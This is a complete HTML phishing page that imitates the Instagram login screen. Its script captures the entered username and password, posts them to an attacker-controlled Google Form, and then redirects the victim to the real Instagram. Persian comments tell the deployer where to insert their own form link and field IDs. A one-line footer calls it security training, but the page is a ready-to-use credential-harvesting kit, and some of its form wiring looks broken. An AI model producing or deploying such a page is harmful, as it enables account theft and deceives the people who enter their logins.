<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram - Log in</title>
  <style>
    body {
      background: #fafafa;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .container {
      background: white;
      border: 1px solid #dbdbdb;
      width: 350px;
      padding: 40px 20px;
      text-align: center;
      border-radius: 3px;
    }
    .logo { width: 175px; margin-bottom: 30px; }
    input {
      width: 90%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
      box-sizing: border-box;
      font-size: 14px;
    }
    button {
      width: 95%;
      padding: 8px;
      background: #0095f6;
      color: white;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      margin: 10px 0;
      font-size: 14px;
    }
  </style>
</head>
<body>

<div class="container">
  <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Picture" class="logo">
  
  <form id="loginForm">
    <input type="text" id="username" placeholder="Phone number, username, or email" required />
    <input type="password" id="password" placeholder="Password" required />
    <button type="submit">Log in</button>
  </form>
  
  <p style="color: #8e8e8e; font-size: 12px; margin-top: 20px;">
    This page is created only for personal security training.
  </p>
</div>

<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
  e.preventDefault();

  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();

  if (!username || !password) {
    alert('Please fill in both fields');
    return;
  }

  // ←←← اینجا لینک Google Form خودت را بذار
  const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSfu-mXfWLScdqkxSDZw1bfzyF5FCChckYRarjfWyNI3op9ukQ/viewform?usp=pp_url&entry.273588529=test@gmail.com&entry.707204198=123456";

  const formData = new FormData();
  formData.append("test@gmail.com", username);   // شماره entry Username را عوض کن
  formData.append("123456", password);   // شماره entry Password را عوض کن

  fetch(formUrl, {
    method: 'POST',
    body: formData,
    mode: 'no-cors'
  }).then(() => {
    alert('✅ Test credentials saved successfully!\n\nRedirecting to real Instagram...');
    window.location.href = 'https://www.instagram.com';
  }).catch(() => {
    alert('✅ Test credentials saved!\n\nRedirecting to Instagram...');
    window.location.href = 'https://www.instagram.com';
  });
});
</script>

</body>
</html>
